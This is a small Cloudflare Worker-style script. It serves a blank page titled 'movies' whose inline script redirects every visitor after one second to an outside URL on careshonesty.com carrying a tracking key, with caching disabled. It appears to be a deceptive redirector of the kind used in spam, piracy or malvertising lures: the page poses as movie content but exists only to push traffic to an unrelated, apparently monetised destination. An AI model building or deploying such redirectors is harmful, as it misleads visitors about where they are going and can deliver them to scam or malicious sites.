export default {
  async fetch(request) {
    const url = new URL(request.url);

    const redirectUrl =
      "https://careshonesty.com/zay5rere?key=e9f30b6f6615c431373fdf3a915b8151";

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>movies</title>
</head>

<body>
<script>
  setTimeout(function() {
    window.location.href = ${JSON.stringify(redirectUrl)};
  }, 1000);
</script>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=UTF-8",
        "Cache-Control": "no-store"
      }
    });
  }
};
